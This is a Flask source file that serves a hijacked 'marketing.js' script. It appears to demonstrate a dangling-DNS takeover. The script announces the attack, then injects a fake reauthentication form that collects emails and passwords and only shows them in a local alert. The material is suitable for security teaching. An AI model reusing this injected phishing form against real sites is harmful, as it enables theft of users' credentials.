from flask import Flask

app = Flask(__name__)

@app.route("/marketing.js")
def hijacked_script():
    return """
    document.addEventListener('DOMContentLoaded', function () {
      alert('🚨 DNS Dangling Attack! This content is from an attacker.');

      document.body.innerHTML += `
        <div style='margin-top:40px; font-size:20px; color:red; text-align:center;'>
          [!] This page was modified by an untrusted source.
        </div>

        <div style='margin-top:30px; border:1px solid red; padding:20px; max-width:400px; margin-left:auto; margin-right:auto; background-color:#ffeeee; border-radius:8px;'>
          <h3 style='color:#cc0000; text-align:center;'>🔒 Reauthentication Required</h3>
          <p style='font-size:14px; text-align:center;'>Your session has expired. Please log in again to continue.</p>
          <form onsubmit="alert('Captured credentials: ' + this.email.value + ' / ' + this.password.value); return false;">
            <input type='email' name='email' placeholder='Email' style='width:100%; margin-bottom:10px; padding:8px; border:1px solid #ccc; border-radius:4px;' required><br>
            <input type='password' name='password' placeholder='Password' style='width:100%; margin-bottom:10px; padding:8px; border:1px solid #ccc; border-radius:4px;' required><br>
            <button type='submit' style='width:100%; padding:10px; background-color:#cc0000; color:white; border:none; border-radius:4px;'>Log In</button>
          </form>
        </div>
      `;

      document.body.style.backgroundColor = '#330000';
    });
    """, 200, {'Content-Type': 'application/javascript'}

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
